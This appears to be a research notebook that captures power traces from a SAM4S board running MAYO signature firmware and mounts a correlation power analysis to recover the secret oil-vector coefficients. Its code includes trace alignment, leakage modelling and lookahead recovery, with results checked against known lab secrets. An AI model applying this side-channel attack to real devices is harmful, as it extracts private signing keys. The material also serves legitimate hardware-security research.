# SAM4S Oil Vector Recovery

In [ ]:
import chipwhisperer as cw
scope = cw.scope()

In [ ]:
scope.default_setup()

In [ ]:
target = cw.target(scope, cw.targets.SimpleSerial2)

In [ ]:
cw.program_target(scope, cw.programmers.SAM4SProgrammer, "../../firmware/mcu/simpleserial-mayo1nssam4s/simpleserial-mayo1nssam4s-CWHUSKY.hex")

In [ ]:
import time
def reset_target(scope):
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high'
    time.sleep(0.05)

target.ser.baud = 38400

In [ ]:
target.simpleserial_write('t', b'')

In [ ]:
resp = target.simpleserial_read('r', 1)
print(resp)

In [ ]:
target.flush()

## Precalculations

In [ ]:
import numpy as np
from data.data import attack_P1, attack_P2, attack_O

attack_P1 = np.array(attack_P1, dtype=np.uint64)
attack_P2 = np.array(attack_P2, dtype=np.uint64)  
attack_O = np.array(attack_O, dtype=np.uint8)

In [ ]:
v = 78
o = 8
O = attack_O
limbs = 5
k0=0

In [ ]:
import numpy as np

LSB_MASK = np.uint64(0x1111111111111111)

def mul_table(b):
    b = int(b) & 0x0F
    x = (b * 0x08040201) & 0xffffffff
    high = x & 0xf0f0f0f0
    return (x ^ (high >> 4) ^ (high >> 3)) & 0xffffffff


def m_vec_mul_add_model(in_vec, a, acc):
    in_vec = np.array(in_vec, dtype=np.uint64)
    acc = np.array(acc, dtype=np.uint64).copy()
    tab = np.uint64(mul_table(a))

    for i, val in enumerate(in_vec):
        val = np.uint64(val)

        v = (
            ((val & LSB_MASK) * (tab & np.uint64(0xff)))
            ^ (((val >> np.uint64(1)) & LSB_MASK) * ((tab >> np.uint64(8))  & np.uint64(0xf)))
            ^ (((val >> np.uint64(2)) & LSB_MASK) * ((tab >> np.uint64(16)) & np.uint64(0xf)))
            ^ (((val >> np.uint64(3)) & LSB_MASK) * ((tab >> np.uint64(24)) & np.uint64(0xf)))
        ) & np.uint64(0xffffffffffffffff)

        acc[i] ^= v

    return acc

In [ ]:
def update_acc_for_coeff(acc_state, guessed_coeff, z, k0, attack_P1, v, limbs):
    for c in range(v):
        if c == z:
            continue

        r0 = min(z, c)
        c0 = max(z, c)
        p1_block = get_P1_block(attack_P1, r0, c0, limbs, v)

        acc_before = acc_state[c, k0, :].copy()
        acc_after = m_vec_mul_add_model(p1_block, guessed_coeff, acc_before)
        acc_state[c, k0, :] = acc_after

    return acc_state

In [ ]:
def upper_tri_bs_index(r, c, v):
    assert 0 <= r <= c < v
    bs = 0
    for rr in range(r):
        bs += v - rr
    bs += (c - r)
    return bs

def get_P1_block(attack_P1, r, c, limbs, v):
    bs = upper_tri_bs_index(r, c, v)
    return extract_p1_entry_by_bs(attack_P1, limbs, bs)

def extract_p1_entry_by_bs(attack_P1, limbs, bs):
    start = bs * limbs
    end = start + limbs
    return np.array(attack_P1[start:end], dtype=np.uint64)


def get_entries_for_coeff(acc_state, attack_P1, v, o, limbs, z, k0):
    dest_rows = []
    p1_blocks = []
    acc_init_blocks = []

    for row in range(v):
        if row == z:
            continue

        r0 = min(z, row)
        c0 = max(z, row)

        p1_block = get_P1_block(attack_P1, r0, c0, limbs, v)
        acc_block = acc_state[row, k0, :].copy()

        dest_rows.append(row)
        p1_blocks.append(p1_block)
        acc_init_blocks.append(acc_block)

    P1_entries = np.array(p1_blocks, dtype=np.uint64)
    acc_init = np.array(acc_init_blocks, dtype=np.uint64)

    return dest_rows, P1_entries, acc_init

In [ ]:
def send_uint64_buffer(target, cmd, arr, chunk_bytes=32):
    raw = np.array(arr, dtype=np.uint64).tobytes()

    for i in range(0, len(raw), chunk_bytes):
        chunk = raw[i:i + chunk_bytes]
        target.simpleserial_write(cmd, chunk)
        target.simpleserial_wait_ack()


def read_uint64_buffer(target, cmd, total_uint64, chunk_bytes=32):
    total_bytes = total_uint64 * 8
    out = bytearray()

    while len(out) < total_bytes:
        need = min(chunk_bytes, total_bytes - len(out))
        target.simpleserial_write(cmd, bytes([need]))
        resp = target.simpleserial_read('r', need)
        out.extend(resp)

    return np.frombuffer(bytes(out), dtype=np.uint64)

## Capture trace

In [ ]:
v = 78
o = 8
O = attack_O
limbs = 5
z = 0
k0=0

acc_state = np.array(attack_P2, dtype=np.uint64).reshape(v, o, limbs).copy()
dest_rows, P1_entries, acc_init = get_entries_for_coeff(
acc_state, attack_P1, v, o, limbs, z, k0
)

P1_entries_flat = P1_entries.reshape(-1)
acc_init_flat = acc_init.reshape(-1)
coeff = int(O[z * o + k0])
print(coeff)

In [ ]:
import matplotlib.pyplot as plt
import os
target.ser.baud = 38400

scope.adc.samples = 101524
scope.trigger.triggers = 'tio4'
scope.adc.timeout = 3

In [ ]:
target.flush()

In [ ]:
send_uint64_buffer(target, 'c', P1_entries_flat)
send_uint64_buffer(target, 'i', acc_init_flat)

target.simpleserial_write('o', bytes([coeff]))
target.simpleserial_wait_ack()

scope.arm()

target.simpleserial_write('a', b'')
target.simpleserial_wait_ack()

ret = scope.capture()

target.simpleserial_write('z', b'')
target.simpleserial_wait_ack()

num_entries = P1_entries.shape[0]  
acc_out_flat = read_uint64_buffer(target, 'g', total_uint64=num_entries * limbs)

acc_out_rows = acc_out_flat.reshape(num_entries, limbs)
trace = scope.get_last_trace()
print("Captured:", len(trace), "samples")

In [ ]:
import matplotlib.pyplot as plt

plt.figure(figsize=(14,4))
plt.plot(trace[0:3100])
plt.title("Raw Power Trace")
plt.xlabel("Sample")
plt.ylabel("Power")
plt.show()

In [ ]:
model_rows = np.zeros_like(acc_init, dtype=np.uint64)
for i in range(P1_entries.shape[0]):
    model_rows[i] = m_vec_mul_add_model(P1_entries[i], int(coeff), acc_init[i].copy())
print("Target shape:", acc_out_rows.shape)
print("Model  shape:", model_rows.shape)
print("Equal?", np.array_equal(acc_out_rows, model_rows))

for i in range(6):
    print(f"Entry {i}, row={dest_rows[i]}")
    print("Before:", [hex(int(x)) for x in acc_init[i]])
    print("Target:", [hex(int(x)) for x in acc_out_rows[i]])
    print("Model :", [hex(int(x)) for x in model_rows[i]])

## POI identification

In [ ]:
from scipy.signal import find_peaks
offset = 508

segment = trace[offset:offset+1308]
inv = -segment

peaks, _ = find_peaks(
    inv,
    height=0.72,     
    distance=10      
)

plt.figure(figsize=(12,4))
plt.plot(segment)

for p in peaks[:700]:
    plt.axvline(p, color='red')

#plt.axvline(310, color='orange')
plt.axvline(200, color='orange')
plt.axvline(180, color='orange')
#plt.axvline(440, color='orange')
#plt.axvline(204, color='orange')
#plt.axvline(598, color='orange')
plt.show()

print("First peaks:", peaks[:700])

## Correlation Power Analysis

### Pre-processing

In [ ]:
from scipy.signal import correlate, find_peaks
START_OFFSET = 508
CALL_LEN = 1308
NUM_ENTRIES = 77

def extract_calls(trace, start_offset=START_OFFSET, call_len=CALL_LEN, num_entries=NUM_ENTRIES):
    segments = []
    for i in range(num_entries):
        start = start_offset + i * call_len
        end = start + call_len
        segments.append(trace[start:end])
    return np.array(segments)


def align_segments(segments,
                             coarse_window=None,
                             fine_window=(1160, 1180),
                             max_coarse_shift=100,
                             max_fine_shift=6):
    L = segments.shape[1]
    ref = segments[0].copy()

    def _align_one(seg, ref_seg, window=None, max_shift=None):
        if window is None:
            x = seg.copy()
            r = ref_seg.copy()
        else:
            s0, e0 = window
            x = seg[s0:e0].copy()
            r = ref_seg[s0:e0].copy()

        x = x - np.mean(x)
        r = r - np.mean(r)

        corr = correlate(x, r, mode="full")
        shift = np.argmax(corr) - (len(x) - 1)

        if max_shift is not None:
            shift = int(np.clip(shift, -max_shift, max_shift))

        if shift > 0:
            seg2 = seg[shift:]
            seg2 = np.pad(seg2, (0, shift), mode="edge")
        elif shift < 0:
            seg2 = np.pad(seg, (-shift, 0), mode="edge")
            seg2 = seg2[:L]
        else:
            seg2 = seg.copy()

        return seg2

    aligned = []

    for seg in segments:
        seg1 = _align_one(seg, ref, window=coarse_window, max_shift=max_coarse_shift)
        seg2 = _align_one(seg1, ref, window=fine_window, max_shift=max_fine_shift)
        aligned.append(seg2)

    return np.vstack(aligned)


def fine_align_segments(segments, fine_window, max_fine_shift=6, ref_idx=0):
    segments = np.array(segments, copy=True)
    ref = segments[ref_idx].copy()
    L = segments.shape[1]

    def _align_one(seg, ref_seg, window=None, max_shift=None):
        if window is None:
            x = seg.copy()
            r = ref_seg.copy()
        else:
            s0, e0 = window
            x = seg[s0:e0].copy()
            r = ref_seg[s0:e0].copy()

        x = x - np.mean(x)
        r = r - np.mean(r)

        corr = correlate(x, r, mode="full")
        shift = np.argmax(corr) - (len(x) - 1)

        if max_shift is not None:
            shift = int(np.clip(shift, -max_shift, max_shift))

        if shift > 0:
            seg2 = seg[shift:]
            seg2 = np.pad(seg2, (0, shift), mode="edge")
        elif shift < 0:
            seg2 = np.pad(seg, (-shift, 0), mode="edge")
            seg2 = seg2[:L]
        else:
            seg2 = seg.copy()

        return seg2

    aligned = []
    for seg in segments:
        seg2 = _align_one(seg, ref, window=fine_window, max_shift=max_fine_shift)
        aligned.append(seg2)

    return np.vstack(aligned)

def plot_segments(segments, n=20):
    plt.figure(figsize=(10, 4))
    for i in range(min(n, len(segments))):
        plt.plot(segments[i], alpha=0.4)
    plt.title("Overlay of aligned segments")
    plt.xlabel("Sample")
    plt.ylabel("Power")
    plt.show()

### Leakage Modelling

In [ ]:
def hw(x):
    return bin(int(x)).count("1")


LSB_MASK = 0x1111111111111111

def mul_table(b):
    b = int(b) & 0x0F
    x = (b * 0x08040201) & 0xffffffff
    high = x & 0xf0f0f0f0
    return (x ^ (high >> 4) ^ (high >> 3)) & 0xffffffff


def m_vec_mul_add_model(in_vec, a, acc):
    in_vec = np.array(in_vec, dtype=np.uint64)
    acc = np.array(acc, dtype=np.uint64).copy()
    tab = mul_table(a)

    for i, val in enumerate(in_vec):
        val = int(val)

        v = (
            ((val & LSB_MASK) * (tab & 0xff))
            ^ (((val >> 1) & LSB_MASK) * ((tab >> 8) & 0xf))
            ^ (((val >> 2) & LSB_MASK) * ((tab >> 16) & 0xf))
            ^ (((val >> 3) & LSB_MASK) * ((tab >> 24) & 0xf))
        ) & 0xffffffffffffffff

        acc[i] ^= np.uint64(v)

    return acc

def build_hypothesis_hw(P1_entries, acc_init, limbs=5):
    NUM_KEYS = 16
    N = P1_entries.shape[0]   

    hyp = np.zeros((NUM_KEYS, N * limbs), dtype=float)

    for k in range(NUM_KEYS):
        idx = 0
        for i in range(N):
            p1 = np.array(P1_entries[i], dtype=np.uint64)
            acc_before = np.array(acc_init[i], dtype=np.uint64)

            acc_after = m_vec_mul_add_model(p1, k, acc_before.copy())

            for limb in range(limbs):
                hyp[k, idx] = hw(int(acc_after[limb]) & 0xffffffff)
                idx += 1

    return hyp

### Power

In [ ]:
import numpy as np
import matplotlib.pyplot as plt
def correlation_scan_window(segments, hyp, window):
    s0, s1 = window
    X = segments[:, s0:s1].astype(float)

    X = X - np.mean(X, axis=0, keepdims=True)

    corr_map = np.zeros((hyp.shape[0], s1 - s0))

    for k in range(hyp.shape[0]):
        h = hyp[k].astype(float)
        h = h - np.mean(h)

        sh = np.std(h)
        if sh < 1e-12:
            continue

        for t in range(X.shape[1]):
            p = X[:, t]
            sp = np.std(p)
            if sp < 1e-12:
                continue

            c = np.corrcoef(h, p)[0, 1]
            if not np.isnan(c):
                corr_map[k, t] = c

    return corr_map

### Correlation

In [ ]:
def plot_corr_map(corr_map, window, title="Correlation map"):
    s0, s1 = window

    plt.figure(figsize=(8, 4))
    plt.imshow(
        corr_map,
        aspect="auto",
        origin="lower",
        extent=[s0, s1 - 1, 0, corr_map.shape[0] - 1]
    )
    plt.colorbar(label="Pearson correlation")
    plt.xlabel("Sample index")
    plt.ylabel("Key candidate")
    plt.title(title)
    plt.tight_layout()
    plt.show()
    
def normalize_limbs(x, limbs):
    x = np.array(x, dtype=float).copy()
    for i in range(limbs):
        xi = x[i::limbs]
        xi -= np.mean(xi)
        s = np.std(xi)
        if s > 1e-12:
            xi /= s
        x[i::limbs] = xi
    return x


def run_cpa(power, hyp, limbs):
    power = normalize_limbs(power, limbs)
    corr = np.zeros(hyp.shape[0])

    for k in range(hyp.shape[0]):
        h = normalize_limbs(hyp[k], limbs)
        if np.std(power) < 1e-12 or np.std(h) < 1e-12:
            continue
        c = np.corrcoef(power, h)[0, 1]
        if not np.isnan(c):
            corr[k] = c
    return corr

In [ ]:
import numpy as np

def recover_oil_soft(
    trace,
    p1,
    acc,
    top_n=3,
    candidates_per_limb=3,
    max_fine_shift=6,
    limb_weight=3.0,
    count_weight=1.0,
    strength_weight=1.0,
    support_bonus_weight=0.08,
):
    limbs = 5

    segments = extract_calls(trace)
    segments_base = align_segments(
        segments,
        coarse_window=None,
        fine_window=(1060, 1090),
        max_coarse_shift=100,
        max_fine_shift=max_fine_shift,
    )

    hyp = build_hypothesis_hw(p1, acc, limbs=limbs)
    hyp_parts = [hyp[:, i::limbs] for i in range(limbs)]

    windows = [
        (216, 220),
        (436, 442),
        (648, 652),
        (866, 870),
        (1080, 1085),
    ]

    limb_data = []
    key_hits = []

    # Finn lokal styrke per limb
    for i in range(limbs):
        segments_i = fine_align_segments(
            segments_base,
            fine_window=windows[i],
            max_fine_shift=max_fine_shift,
        )

        corr_map = correlation_scan_window(segments_i, hyp_parts[i], windows[i])

        score_map = np.maximum(-corr_map, 0.0)

        sample_strength = np.max(score_map, axis=0)
        best_key_per_sample = np.argmax(score_map, axis=0)

        top_local = np.argsort(sample_strength)[-candidates_per_limb:]

        for loc in top_local:
            key_hits.append({
                "limb": i,
                "key": int(best_key_per_sample[loc]),
                "strength": float(sample_strength[loc]),
            })

        limb_data.append({
            "sample_strength": sample_strength,
            "best_key_per_sample": best_key_per_sample,
            "window": windows[i],
        })

    key_stats = {}
    for hit in key_hits:
        k = hit["key"]
        if k not in key_stats:
            key_stats[k] = {
                "count": 0,
                "limbs": set(),
                "strength_sum": 0.0,
            }
        key_stats[k]["count"] += 1
        key_stats[k]["limbs"].add(hit["limb"])
        key_stats[k]["strength_sum"] += hit["strength"]

    key_support = {}
    for k, stats in key_stats.items():
        num_limbs = len(stats["limbs"])
        count = stats["count"]
        strength_sum = stats["strength_sum"]

        key_support[k] = (
            limb_weight * num_limbs +
            count_weight * count +
            strength_weight * strength_sum
        )

    power_parts = []
    poi_lists = []

    for i in range(limbs):
        sample_strength = limb_data[i]["sample_strength"]
        best_key_per_sample = limb_data[i]["best_key_per_sample"]
        wstart, _ = limb_data[i]["window"]

        combined_score = np.zeros_like(sample_strength, dtype=float)

        for s in range(len(sample_strength)):
            k = int(best_key_per_sample[s])
            support = key_support.get(k, 0.0)
            combined_score[s] = sample_strength[s] + support_bonus_weight * support

        chosen_local = np.argsort(combined_score)[-top_n:]
        chosen_local = np.asarray(chosen_local, dtype=np.int64)

        poi_sample = np.sort(chosen_local + wstart).astype(np.int64)
        poi_lists.append(poi_sample)

        p = np.mean(segments[:, poi_sample], axis=1)
        p = (p - np.mean(p)) / (np.std(p) + 1e-12)
        power_parts.append(p)

    N = len(power_parts[0])
    power = np.empty(limbs * N)
    for i in range(limbs):
        power[i::limbs] = power_parts[i]

    corr = run_cpa(power, hyp, limbs)

    guess = np.argmin(corr)


    debug = {
        "key_stats": {
            k: {
                "count": v["count"],
                "num_limbs": len(v["limbs"]),
                "strength_sum": v["strength_sum"],
                "support": key_support[k],
            }
            for k, v in key_stats.items()
        }
    }

    return guess, corr, poi_lists, power, hyp, debug

In [ ]:
def recover_oil(trace, acc, p1, top_n=1):
    limbs=5
    segments = extract_calls(trace)
    segments_base = align_segments(
        segments,
        coarse_window=None,
        fine_window=(1060, 1090),
        max_coarse_shift=100,
        max_fine_shift=6)

    hyp = build_hypothesis_hw(P1_entries, acc_init, limbs=5)
    
    hyp_parts = [hyp[:, i::limbs] for i in range(limbs)]

    
    w0s, w0e = 216, 220
    w1s, w1e = 436, 442
    w2s, w2e = 648, 652
    w3s, w3e = 866, 870
    w4s, w4e = 1080, 1085


    windows = [
    (w0s, w0e),
    (w1s, w1e),
    (w2s, w2e),
    (w3s, w3e),
    (w4s, w4e),
    ]
    
    power_parts = []
    poi_lists = []

    for i in range(limbs):
        segments_i = fine_align_segments(
            segments_base,
            fine_window=windows[i],
            max_fine_shift=6
        )

        corr_map = correlation_scan_window(segments_i, hyp_parts[i], windows[i])
        neg_map = np.maximum(-corr_map, 0.0)
        sample_strength = np.max(neg_map, axis=0)

        poi_local = np.argsort(sample_strength)[-top_n:]
        poi_sample = np.sort(poi_local + windows[i][0])

        p = np.mean(segments[:, poi_sample], axis=1)
        p = (p - np.mean(p)) / (np.std(p) + 1e-12)

        power_parts.append(p)
        poi_lists.append(poi_sample)

    N = power_parts[0].size
    power = np.empty(limbs * N)
    for i in range(limbs):
        power[i::limbs] = power_parts[i]

    corr = run_cpa(power, hyp, limbs)
    guess = np.argmax(np.abs(corr))

    return guess, corr, poi_lists, power, hyp

In [ ]:
#guess, corr, poi_list, power, hyp = recover_oil(trace, acc_init, P1_entries, top_n=4)
#print(debug)
#guess, corr, poi_lists, power, hyp = recover_oil_simple(trace, P1_entries, acc_init, top_n=5)

guess, corr, poi_lists, power, hyp, debug = recover_oil_soft(trace, P1_entries, acc_init, top_n=4)

print("Recovered oil coefficient:", guess)

for i,c in enumerate(corr):
    print(i, c)

y = np.abs(corr)
max_idx = np.argmax(y)
max_val = y[max_idx]

plt.figure(figsize=(8,4))
plt.plot(range(16), y)  # ingen markører
plt.scatter(max_idx, max_val, color='green', s=50, label="guessed oil value: " + str(guess))
plt.xlabel("Guess")
plt.ylabel("Correlation")
plt.title("CPA result (385 samples)")
plt.grid(True)
plt.legend()
plt.show()

## Oil Vector Recovery

In [ ]:
import matplotlib.pyplot as plt
import os
target.ser.baud = 38400

scope.adc.samples = 101524
scope.trigger.triggers = 'tio4'
scope.adc.timeout = 3

In [ ]:
import numpy as np

def recover_oil_vector_dual_state_soft(
    column,
    acc_state_fw,
    acc_state_model,
    attack_P1,
    true_O,
    v,
    o,
    limbs,
    scope,
    target_dev,
    top_n=4,
    num_rows=None,
    ambiguity_margin=0.06,
    lookahead_top_k=2,
    current_weight_winner=1.0,
    current_weight_margin=1.0,
    next_weight_winner=1.0,
    next_weight_margin=1.0,
):
    oil_vector = []
    margins = []

    if num_rows is None:
        num_rows = v

    def capture_trace_for_row(acc_state_fw_local, row_idx):
        true_coeff_local = int(true_O[row_idx * o + column])

        _, P1_entries_fw, acc_init_fw = get_entries_for_coeff(
            acc_state=acc_state_fw_local,
            attack_P1=attack_P1,
            v=v,
            o=o,
            limbs=limbs,
            z=row_idx,
            k0=column,
        )

        target_dev.flush()
        send_uint64_buffer(target_dev, 'c', P1_entries_fw.reshape(-1))
        send_uint64_buffer(target_dev, 'i', acc_init_fw.reshape(-1))

        target_dev.simpleserial_write('o', bytes([true_coeff_local]))
        target_dev.simpleserial_wait_ack()

        scope.arm()
        target_dev.simpleserial_write('a', b'')
        target_dev.simpleserial_wait_ack()

        ret = scope.capture()
        if ret:
            raise RuntimeError(f"Capture failed for row={row_idx}, column={column}")

        trace_local = scope.get_last_trace()
        if trace_local is None:
            raise RuntimeError(f"No trace received for row={row_idx}, column={column}")

        target_dev.simpleserial_write('z', b'')
        target_dev.simpleserial_wait_ack()

        return trace_local, true_coeff_local

    def analyze_row_with_model_state(trace_local, acc_state_model_local, row_idx):
        _, P1_entries_model, acc_init_model = get_entries_for_coeff(
            acc_state=acc_state_model_local,
            attack_P1=attack_P1,
            v=v,
            o=o,
            limbs=limbs,
            z=row_idx,
            k0=column,
        )

        guess_local, corr_local, poi_lists_local, power_local, hyp_local, debug_local = recover_oil_soft(
            trace_local,
            P1_entries_model,
            acc_init_model,
            top_n=top_n,
        )

        winner_corr_local = corr_local[guess_local]

        corr_tmp_local = np.array(corr_local, copy=True)
        corr_tmp_local[guess_local] = np.inf
        runner_up_local = int(np.argmin(corr_tmp_local))
        runner_up_corr_local = corr_local[runner_up_local]

        margin_local = runner_up_corr_local - winner_corr_local

        return {
            "guess": guess_local,
            "corr": corr_local,
            "winner_corr": winner_corr_local,
            "runner_up": runner_up_local,
            "runner_up_corr": runner_up_corr_local,
            "margin": margin_local,
            "debug": debug_local,
        }

    for row in range(num_rows):
        true_coeff = int(true_O[row * o + column])


        trace, _ = capture_trace_for_row(acc_state_fw, row)

        analysis = analyze_row_with_model_state(trace, acc_state_model, row)

        local_best = analysis["guess"]
        corr = analysis["corr"]
        local_winner_corr = analysis["winner_corr"]
        local_runner_up = analysis["runner_up"]
        local_runner_up_corr = analysis["runner_up_corr"]
        local_margin = analysis["margin"]
        true_corr = corr[true_coeff]

        final_guess = local_best
        final_winner_corr = local_winner_corr
        final_runner_up = local_runner_up
        final_runner_up_corr = local_runner_up_corr
        final_margin = local_margin

        used_lookahead = False
        lookahead_details = None

        if row + 1 < num_rows and local_margin < ambiguity_margin:
            used_lookahead = True

            top_candidates = np.argsort(corr)[:lookahead_top_k]

            next_acc_state_fw = update_acc_for_coeff(
                acc_state=acc_state_fw.copy(),
                guessed_coeff=true_coeff,
                attack_P1=attack_P1,
                v=v,
                limbs=limbs,
                z=row,
                k0=column,
            )

            next_trace, next_true_coeff = capture_trace_for_row(next_acc_state_fw, row + 1)

            best_candidate = None
            best_total_score = -np.inf
            best_info = None

            candidate_infos = []

            for cand in top_candidates:
                cand = int(cand)

                current_corr = corr[cand]

                corr_tmp = np.array(corr, copy=True)
                corr_tmp[cand] = np.inf
                current_runner_up = int(np.argmin(corr_tmp))
                current_runner_up_corr = corr[current_runner_up]
                current_margin = current_runner_up_corr - current_corr

                candidate_acc_state_model = update_acc_for_coeff(
                    acc_state=acc_state_model.copy(),
                    guessed_coeff=cand,
                    attack_P1=attack_P1,
                    v=v,
                    limbs=limbs,
                    z=row,
                    k0=column,
                )

                next_analysis = analyze_row_with_model_state(
                    next_trace,
                    candidate_acc_state_model,
                    row + 1,
                )

                next_guess = next_analysis["guess"]
                next_winner_corr = next_analysis["winner_corr"]
                next_margin = next_analysis["margin"]

                total_score = (
                    current_weight_winner * (-current_corr)
                    + current_weight_margin * current_margin
                    + next_weight_winner * (-next_winner_corr)
                    + next_weight_margin * next_margin
                )

                info = {
                    "candidate": cand,
                    "current_corr": current_corr,
                    "current_margin": current_margin,
                    "next_guess": next_guess,
                    "next_true": next_true_coeff,
                    "next_winner_corr": next_winner_corr,
                    "next_margin": next_margin,
                    "total_score": total_score,
                }
                candidate_infos.append(info)

                if total_score > best_total_score:
                    best_total_score = total_score
                    best_candidate = cand
                    best_info = info

            final_guess = best_candidate
            final_winner_corr = corr[final_guess]

            corr_tmp = np.array(corr, copy=True)
            corr_tmp[final_guess] = np.inf
            final_runner_up = int(np.argmin(corr_tmp))
            final_runner_up_corr = corr[final_runner_up]
            final_margin = final_runner_up_corr - final_winner_corr

            lookahead_details = {
                "candidates": candidate_infos,
                "chosen": best_info,
            }

        oil_vector.append(final_guess)
        margins.append(final_margin)

        print(
            f"row={row:2d}, true={true_coeff}, "
            f"local_best={local_best}, final_guess={final_guess}, "
            f"local_corr={local_winner_corr:.6f}, true_corr={true_corr:.6f}, "
            f"local_runner_up={local_runner_up}, local_runner_up_corr={local_runner_up_corr:.6f}, "
            f"local_margin={local_margin:.6f}, "
            f"{'LOOKAHEAD' if used_lookahead else 'DIRECT'}, "
            f"{'OK' if final_guess == true_coeff else 'WRONG'}"
        )

        if used_lookahead and lookahead_details is not None:
            print("    lookahead candidates:")
            for info in lookahead_details["candidates"]:
                print(
                    f"      cand={info['candidate']}, "
                    f"curr_corr={info['current_corr']:.6f}, "
                    f"curr_margin={info['current_margin']:.6f}, "
                    f"next_guess={info['next_guess']}, "
                    f"next_true={info['next_true']}, "
                    f"next_winner_corr={info['next_winner_corr']:.6f}, "
                    f"next_margin={info['next_margin']:.6f}, "
                    f"total_score={info['total_score']:.6f}"
                )
            chosen = lookahead_details["chosen"]
            print(
                f"    chosen_by_lookahead: cand={chosen['candidate']}, "
                f"next_guess={chosen['next_guess']}, "
                f"next_true={chosen['next_true']}, "
                f"total_score={chosen['total_score']:.6f}"
            )

        acc_state_fw = update_acc_for_coeff(
            acc_state=acc_state_fw,
            guessed_coeff=true_coeff,
            attack_P1=attack_P1,
            v=v,
            limbs=limbs,
            z=row,
            k0=column,
        )

        acc_state_model = update_acc_for_coeff(
            acc_state=acc_state_model,
            guessed_coeff=final_guess,
            attack_P1=attack_P1,
            v=v,
            limbs=limbs,
            z=row,
            k0=column,
        )

    print("mean margin:", np.mean(margins))
    print("min margin :", np.min(margins))
    print("max margin :", np.max(margins))
    for i in range(6):
        print(f"row {i}, fw   :", [hex(int(x)) for x in acc_state_fw[i, column]])
        print(f"row {i}, model:", [hex(int(x)) for x in acc_state_model[i, column]])


    return oil_vector, acc_state_fw, acc_state_model

In [ ]:
acc_state_init = np.array(attack_P2, dtype=np.uint64).reshape(v, o, limbs).copy()

In [ ]:
oil_vector, acc_fw_after, acc_model_after = recover_oil_vector_dual_state_soft(
    column=0,
    acc_state_fw=acc_state_init.copy(),
    acc_state_model=acc_state_init.copy(),
    attack_P1=attack_P1,
    true_O=attack_O,
    v=v,
    o=o,
    limbs=limbs,
    scope=scope,
    target_dev=target,
    top_n=3,
    ambiguity_margin=0.06,
    lookahead_top_k=3,
    current_weight_winner=1.0,
    current_weight_margin=1.0,
    next_weight_winner=1.0,
    next_weight_margin=1.0,
)

In [ ]:
expected_col0 = attack_O[0::8]
print("Match:", expected_col0 == oil_vector)
print("Length expected:", len(expected_col0))
print("Length recovered:", len(oil_vector))

### Accumulator state after all updates on MAYO-C PC

##### Entry 0 (r,c)=(0,77) dest=0 coeff=O[77,0]=13
**acc_after** : 2dd00fa0913c538f b330c591d3a8679f 008f95dc167c6f54 43b61237cff3e8e7 001e45a5365e3f1f

##### Entry 1 (r,c)=(1,77) dest=1 coeff=O[77,0]=13
**acc_after** : 660f40900f8ed461 af1d7b911b3cde3e 22148e2de7e1b2d9 9905a37a057ba2fb 001ca84e72d3d154

##### Entry 2 (r,c)=(2,77) dest=2 coeff=O[77,0]=13
**acc_after** : d1dce73edd330051 e34836da106bf017 7652b2bff1f5a915 e7edfb04e934e6f5 00d19134ab08468c

##### Entry 3 (r,c)=(3,77) dest=3 coeff=O[77,0]=13 
**acc_after** : f1bceb2847b47f26 40fa6344627ed761 89eebc7ea7301eb9 ff53643929c7d4eb 0032a812db3ff726

##### Entry 4 (r,c)=(4,77) dest=4 coeff=O[77,0]=13
**acc_after** : 005808dda0d381ed f7bf91cdbad3deab 8e2b1ae2893d9bd8 5107abefd65113ab 00c948a0999c761c

##### Entry 5 (r,c)=(5,77) dest=5 coeff=O[77,0]=13
**acc_after** : 0e6e603ee12e3d22 5f8f10db0e6c2ffa c03f73ee866da4e8 2d3502cb0e997395 00b943502605671b
